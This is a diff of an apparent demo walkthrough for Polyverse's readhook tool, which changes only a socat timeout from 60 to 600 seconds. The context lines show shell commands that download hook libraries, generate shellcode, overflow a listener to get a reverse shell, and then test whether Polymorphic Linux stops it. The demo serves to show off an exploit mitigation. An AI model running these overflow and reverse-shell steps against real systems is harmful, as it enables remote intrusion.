@@ -16,12 +16,12 @@
     wget -q -O /tmp/basehook.so https://github.com/polyverse/readhook/releases/download/jenkins/basehook.so
     wget -q -O /tmp/fullhook.so https://github.com/polyverse/readhook/releases/download/jenkins/fullhook.so
 ### (2) Start nc with readhook in front of libc
-    socat -T60 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD='/tmp/fullhook.so:/tmp/basehook.so' /bin/cat"
+    socat -T600 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD='/tmp/fullhook.so:/tmp/basehook.so' /bin/cat"
 ## Generate Shell-Code and Perform Exploit
 ### (3) Generate shell-code for the exploit (Session-3)
     export shellCode=$(echo "xyzzxMAKELOADdocker.for.mac.localhost" | nc localhost 8080)
 ### (2) Re-start nc with minimal readhook in front of libc
-    socat -T60 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD=/tmp/basehook.so /bin/cat"
+    socat -T600 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD=/tmp/basehook.so /bin/cat"
 ### (3) Send shell-code to the OVERFLOW for a reverse shell
     echo $shellCode | nc localhost 8080
 ### (1) Check that the overflow resulted in a remote shell
@@ -33,7 +33,7 @@
     # (Execute the command given at the end of the previous step)
 ## Test Polyverse Polymorphic Linux
 ### (2) Re-start nc with minimal readhook
-    socat -T60 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD=/tmp/basehook.so /bin/cat"
+    socat -T600 TCP4-LISTEN:8080,reuseaddr SYSTEM:"/usr/bin/env LD_PRELOAD=/tmp/basehook.so /bin/cat"
 ### (3) Try the shellCode with Polymorphic Linux
     echo $shellCode | nc localhost 8080
 ### (1) Confirm that nobody phoned-home to the listener
